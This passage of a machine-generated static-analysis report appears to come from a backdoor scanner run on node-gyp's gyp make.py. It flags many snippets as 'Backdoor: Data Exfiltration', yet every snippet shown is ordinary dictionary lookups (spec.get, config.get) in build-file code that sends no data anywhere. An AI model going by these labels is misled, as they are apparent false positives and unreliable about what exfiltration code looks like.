                      "markdown": "`        path = os.path.join(\"$(obj).\" + self.toolset, self.path)\n        if self.type == \"executable\" or self._InstallImmediately():\n            path = \"$(builddir)\"\n        path = spec.get(\"product_dir\", path)\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def ComputeMacBundleOutput(self, spec):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1603,
                  "startColumn": 26,
                  "endLine": 1603,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n\n",
                    "rendered": {
                      "text": "\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n\n",
                      "markdown": "`\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1602,
                  "startColumn": 21,
                  "endLine": 1602,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n",
                    "rendered": {
                      "text": "            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n",
                      "markdown": "`            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n            target_ext = \".\" + product_ext\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1601,
                  "startColumn": 28,
                  "endLine": 1601,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                target,\n            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n",
                    "rendered": {
                      "text": "                target,\n            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n",
                      "markdown": "`                target,\n            )\n\n        target_prefix = spec.get(\"product_prefix\", target_prefix)\n        target = spec.get(\"product_name\", target)\n        product_ext = spec.get(\"product_extension\")\n        if product_ext:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1431,
                  "startColumn": 29,
                  "endLine": 1431,
                  "endColumn": 34,
                  "snippet": {
                    "text": "                self.WriteList(cflags_objc, \"CFLAGS_OBJC_%s\" % configname)\n                self.WriteLn(\"# Flags passed to only ObjC++ files.\")\n                self.WriteList(cflags_objcc, \"CFLAGS_OBJCC_%s\" % configname)\n            includes = config.get(\"include_dirs\")\n            if includes:\n                includes = [Sourceify(self.Absolutify(i)) for i in includes]\n            self.WriteList(includes, \"INCS_%s\" % configname, prefix=\"-I\")\n",
                    "rendered": {
                      "text": "                self.WriteList(cflags_objc, \"CFLAGS_OBJC_%s\" % configname)\n                self.WriteLn(\"# Flags passed to only ObjC++ files.\")\n                self.WriteList(cflags_objcc, \"CFLAGS_OBJCC_%s\" % configname)\n            includes = config.get(\"include_dirs\")\n            if includes:\n                includes = [Sourceify(self.Absolutify(i)) for i in includes]\n            self.WriteList(includes, \"INCS_%s\" % configname, prefix=\"-I\")\n",
                      "markdown": "`                self.WriteList(cflags_objc, \"CFLAGS_OBJC_%s\" % configname)\n                self.WriteLn(\"# Flags passed to only ObjC++ files.\")\n                self.WriteList(cflags_objcc, \"CFLAGS_OBJCC_%s\" % configname)\n            includes = config.get(\"include_dirs\")\n            if includes:\n                includes = [Sourceify(self.Absolutify(i)) for i in includes]\n            self.WriteList(includes, \"INCS_%s\" % configname, prefix=\"-I\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1418,
                  "startColumn": 34,
                  "endLine": 1418,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n            self.WriteList(cflags, \"CFLAGS_%s\" % configname)\n",
                    "rendered": {
                      "text": "            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n            self.WriteList(cflags, \"CFLAGS_%s\" % configname)\n",
                      "markdown": "`            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n            self.WriteList(cflags, \"CFLAGS_%s\" % configname)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1417,
                  "startColumn": 33,
                  "endLine": 1417,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n",
                    "rendered": {
                      "text": "                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n",
                      "markdown": "`                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n            self.WriteLn(\"# Flags passed to all source files.\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1416,
                  "startColumn": 31,
                  "endLine": 1416,
                  "endColumn": 36,
                  "snippet": {
                    "text": "                cflags_objc = self.xcode_settings.GetCflagsObjC(configname)\n                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n",
                    "rendered": {
                      "text": "                cflags_objc = self.xcode_settings.GetCflagsObjC(configname)\n                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n",
                      "markdown": "`                cflags_objc = self.xcode_settings.GetCflagsObjC(configname)\n                cflags_objcc = self.xcode_settings.GetCflagsObjCC(configname)\n            else:\n                cflags = config.get(\"cflags\")\n                cflags_c = config.get(\"cflags_c\")\n                cflags_cc = config.get(\"cflags_cc\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1409,
                  "startColumn": 43,
                  "endLine": 1409,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\n            if self.flavor == \"mac\":\n                cflags = self.xcode_settings.GetCflags(\n                    configname, arch=config.get(\"xcode_configuration_platform\")\n                )\n                cflags_c = self.xcode_settings.GetCflagsC(configname)\n                cflags_cc = self.xcode_settings.GetCflagsCC(configname)\n",
                    "rendered": {
                      "text": "\n            if self.flavor == \"mac\":\n                cflags = self.xcode_settings.GetCflags(\n                    configname, arch=config.get(\"xcode_configuration_platform\")\n                )\n                cflags_c = self.xcode_settings.GetCflagsC(configname)\n                cflags_cc = self.xcode_settings.GetCflagsCC(configname)\n",
                      "markdown": "`\n            if self.flavor == \"mac\":\n                cflags = self.xcode_settings.GetCflags(\n                    configname, arch=config.get(\"xcode_configuration_platform\")\n                )\n                cflags_c = self.xcode_settings.GetCflagsC(configname)\n                cflags_cc = self.xcode_settings.GetCflagsCC(configname)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1401,
                  "startColumn": 22,
                  "endLine": 1401,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        for configname in sorted(configs.keys()):\n            config = configs[configname]\n            self.WriteList(\n                config.get(\"defines\"),\n                \"DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=EscapeCppDefine,\n",
                    "rendered": {
                      "text": "        for configname in sorted(configs.keys()):\n            config = configs[configname]\n            self.WriteList(\n                config.get(\"defines\"),\n                \"DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=EscapeCppDefine,\n",
                      "markdown": "`        for configname in sorted(configs.keys()):\n            config = configs[configname]\n            self.WriteList(\n                config.get(\"defines\"),\n                \"DEFS_%s\" % configname,\n                prefix=\"-D\",\n                quoter=EscapeCppDefine,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1183,
                  "startColumn": 49,
                  "endLine": 1183,
                  "endColumn": 54,
                  "snippet": {
                    "text": "                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n                    for i in [rule_source] + rule.get(\"inputs\", [])\n                ]\n                actions = [\"$(call do_cmd,%s_%d)\" % (name, count)]\n\n",
                    "rendered": {
                      "text": "                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n                    for i in [rule_source] + rule.get(\"inputs\", [])\n                ]\n                actions = [\"$(call do_cmd,%s_%d)\" % (name, count)]\n\n",
                      "markdown": "`                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n                    for i in [rule_source] + rule.get(\"inputs\", [])\n                ]\n                actions = [\"$(call do_cmd,%s_%d)\" % (name, count)]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1179,
                  "startColumn": 27,
                  "endLine": 1179,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n",
                    "rendered": {
                      "text": "                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n",
                      "markdown": "`                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n                inputs = [\n                    Sourceify(self.Absolutify(i))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1177,
                  "startColumn": 27,
                  "endLine": 1177,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                    dir = os.path.dirname(out)\n                    if dir:\n                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n",
                    "rendered": {
                      "text": "                    dir = os.path.dirname(out)\n                    if dir:\n                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n",
                      "markdown": "`                    dir = os.path.dirname(out)\n                    if dir:\n                        dirs.add(dir)\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources += outputs\n                if int(rule.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                    extra_mac_bundle_resources += outputs\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1161,
                  "startColumn": 35,
                  "endLine": 1161,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n            all_outputs = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                dirs = set()\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n",
                    "rendered": {
                      "text": "\n            all_outputs = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                dirs = set()\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n",
                      "markdown": "`\n            all_outputs = []\n\n            for rule_source in rule.get(\"rule_sources\", []):\n                dirs = set()\n                (rule_source_dirname, rule_source_basename) = os.path.split(rule_source)\n                (rule_source_root, rule_source_ext) = os.path.splitext(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1045,
                  "startColumn": 25,
                  "endLine": 1045,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n\n            # Write the actual command.\n",
                    "rendered": {
                      "text": "                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n\n            # Write the actual command.\n",
                      "markdown": "`                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n\n            # Write the actual command.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1043,
                  "startColumn": 25,
                  "endLine": 1043,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n",
                    "rendered": {
                      "text": "                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n",
                      "markdown": "`                dir = os.path.split(out)[0]\n                if dir:\n                    dirs.add(dir)\n            if int(action.get(\"process_outputs_as_sources\", False)):\n                extra_sources += outputs\n            if int(action.get(\"process_outputs_as_mac_bundle_resources\", False)):\n                extra_mac_bundle_resources += outputs\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 977,
                  "startColumn": 31,
                  "endLine": 977,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n        # Currently any versions have the same effect, but in future the behavior\n        # could be different.\n        if self.generator_flags.get(\"android_ndk_version\", None):\n            self.WriteAndroidNdkModuleRule(self.target, all_sources, link_deps)\n\n        self.fp.close()\n",
                    "rendered": {
                      "text": "\n        # Currently any versions have the same effect, but in future the behavior\n        # could be different.\n        if self.generator_flags.get(\"android_ndk_version\", None):\n            self.WriteAndroidNdkModuleRule(self.target, all_sources, link_deps)\n\n        self.fp.close()\n",
                      "markdown": "`\n        # Currently any versions have the same effect, but in future the behavior\n        # could be different.\n        if self.generator_flags.get(\"android_ndk_version\", None):\n            self.WriteAndroidNdkModuleRule(self.target, all_sources, link_deps)\n\n        self.fp.close()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 923,
                  "startColumn": 26,
                  "endLine": 923,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            self.WriteMacInfoPlist(mac_bundle_deps)\n\n        # Sources.\n        all_sources = spec.get(\"sources\", []) + extra_sources\n        if all_sources:\n            self.WriteSources(\n                configs,\n",
                    "rendered": {
                      "text": "            self.WriteMacInfoPlist(mac_bundle_deps)\n\n        # Sources.\n        all_sources = spec.get(\"sources\", []) + extra_sources\n        if all_sources:\n            self.WriteSources(\n                configs,\n",
                      "markdown": "`            self.WriteMacInfoPlist(mac_bundle_deps)\n\n        # Sources.\n        all_sources = spec.get(\"sources\", []) + extra_sources\n        if all_sources:\n            self.WriteSources(\n                configs,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 917,
                  "startColumn": 20,
                  "endLine": 917,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        # Bundle resources.\n        if self.is_mac_bundle:\n            all_mac_bundle_resources = (\n                spec.get(\"mac_bundle_resources\", []) + extra_mac_bundle_resources\n            )\n            self.WriteMacBundleResources(all_mac_bundle_resources, mac_bundle_deps)\n            self.WriteMacInfoPlist(mac_bundle_deps)\n",
                    "rendered": {
                      "text": "        # Bundle resources.\n        if self.is_mac_bundle:\n            all_mac_bundle_resources = (\n                spec.get(\"mac_bundle_resources\", []) + extra_mac_bundle_resources\n            )\n            self.WriteMacBundleResources(all_mac_bundle_resources, mac_bundle_deps)\n            self.WriteMacInfoPlist(mac_bundle_deps)\n",
                      "markdown": "`        # Bundle resources.\n        if self.is_mac_bundle:\n            all_mac_bundle_resources = (\n                spec.get(\"mac_bundle_resources\", []) + extra_mac_bundle_resources\n            )\n            self.WriteMacBundleResources(all_mac_bundle_resources, mac_bundle_deps)\n            self.WriteMacInfoPlist(mac_bundle_deps)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 878,
                  "startColumn": 16,
                  "endLine": 878,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            self.output = self.output_binary = replace_sep(self.ComputeOutput(spec))\n\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n        self._INSTALLABLE_TARGETS = (\"executable\", \"loadable_module\", \"shared_library\")\n        if self.is_standalone_static_library or self.type in self._INSTALLABLE_TARGETS:\n",
                    "rendered": {
                      "text": "            self.output = self.output_binary = replace_sep(self.ComputeOutput(spec))\n\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n        self._INSTALLABLE_TARGETS = (\"executable\", \"loadable_module\", \"shared_library\")\n        if self.is_standalone_static_library or self.type in self._INSTALLABLE_TARGETS:\n",
                      "markdown": "`            self.output = self.output_binary = replace_sep(self.ComputeOutput(spec))\n\n        self.is_standalone_static_library = bool(\n            spec.get(\"standalone_static_library\", 0)\n        )\n        self._INSTALLABLE_TARGETS = (\"executable\", \"loadable_module\", \"shared_library\")\n        if self.is_standalone_static_library or self.type in self._INSTALLABLE_TARGETS:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 35,
                  "endLine": 123,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        generator_wants_sorted_dependencies = True\n\n    output_dir = params[\"options\"].generator_output or params[\"options\"].toplevel_dir\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(output_dir, builddir_name, \"gypfiles\")\n    )\n",
                    "rendered": {
                      "text": "        generator_wants_sorted_dependencies = True\n\n    output_dir = params[\"options\"].generator_output or params[\"options\"].toplevel_dir\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(output_dir, builddir_name, \"gypfiles\")\n    )\n",
                      "markdown": "`        generator_wants_sorted_dependencies = True\n\n    output_dir = params[\"options\"].generator_output or params[\"options\"].toplevel_dir\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    qualified_out_dir = os.path.normpath(\n        os.path.join(output_dir, builddir_name, \"gypfiles\")\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 41,
                  "endLine": 116,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n        global generator_wants_sorted_dependencies\n",
                    "rendered": {
                      "text": "    \"\"\"Calculate the generator specific info that gets fed to input (called by\n    gyp).\"\"\"\n    generator_flags = params.get(\"generator_flags\", {})\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    # Android NDK requires a strict link order.\n    if android_ndk_version:\n        global generator_wants_sorted_dependencies\n",
